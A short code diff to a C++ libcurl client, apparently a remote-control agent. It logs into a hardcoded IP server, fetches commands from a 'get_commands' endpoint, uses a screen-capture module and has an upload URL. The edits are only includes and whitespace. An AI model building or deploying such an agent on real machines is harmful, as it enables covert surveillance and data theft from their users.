@@ -3,8 +3,9 @@
 #include <string>
 #include <regex>
 #include <curl/curl.h>
+#include "zlib.h"
 #include "ScreenCapture.h"
-#include "FileUtils.h"  // Inclure le fichier header
+#include "FileUtils.h" 
 
 
 struct CommandInfo {
@@ -17,6 +18,7 @@ size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* out
     output->append(reinterpret_cast<const char*>(contents), totalSize);
     return totalSize;
 }
+
 
 std::string extractCsrfToken(const std::string& htmlContent) {
     std::regex regexPattern("<input type=\"hidden\" name=\"csrf_token\" value=\"([^\"]*)\">");
@@ -50,6 +52,7 @@ CommandInfo extractCommandAndUuidFromJson(const std::string& jsonResponse) {
 }
 
 int main() {
+
     const char* loginUrl = "https://16.16.16.114:5000/login";
     const char* commandsUrl = "https://16.16.16.114:5000/get_commands";
     const char* uploadUrl = "https://16.16.16.114:5000/upload";
@@ -178,6 +181,6 @@ int main() {
         std::cerr << "Unable to initialize cURL." << std::endl;
         return 1;
     }
-
+    
     return 0;
 }
